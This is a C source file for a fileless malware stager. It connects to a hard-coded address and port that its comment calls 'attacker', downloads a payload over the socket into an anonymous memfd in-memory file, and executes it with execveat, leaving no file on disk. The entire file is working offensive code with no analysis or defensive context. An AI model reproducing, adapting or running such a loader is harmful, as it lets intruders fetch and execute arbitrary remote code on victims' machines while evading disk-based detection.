#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/mman.h>


#define SYSCALL_memfd_create 319
#define MFD_CLOEXEC 1
#define BUF_SIZE 1024
#define SYSCALL_execveat 322 
#define AT_EMPTY_PATH 0x1000

static inline int memfd_create(const char *name, unsigned int flags)         // wrapper for the memfd_create syscall
{
	return syscall(SYSCALL_memfd_create, name, flags);
}

static inline int execveat(int fd, const char *name, int flags)
{
	return syscall(SYSCALL_execveat,fd, name, NULL, NULL, flags);
}
int	main(int argc, char *argv[], char *env[])
{
	int	fd;
	int	s, l;
	unsigned long addr = 0x0100007f11110002;
	unsigned char buf[BUF_SIZE];

	// connect to attacker -> download from socket fd and write into fd 'a'
	s = socket(AF_INET, SOCK_STREAM, 0);
	connect(s, (struct sockaddr*)&addr, 16);
	fd = memfd_create("y", MFD_CLOEXEC);  // create fd in memory

	while (1)
	{
		if ((l = recv(s, buf, BUF_SIZE, MSG_WAITALL)) <= 0)  // download
			break;
		write(fd, buf, l);  // write into fd
	}
	close(s); // close socket
	execveat(fd, "", AT_EMPTY_PATH); // execute fd in memory
	return (0);
}
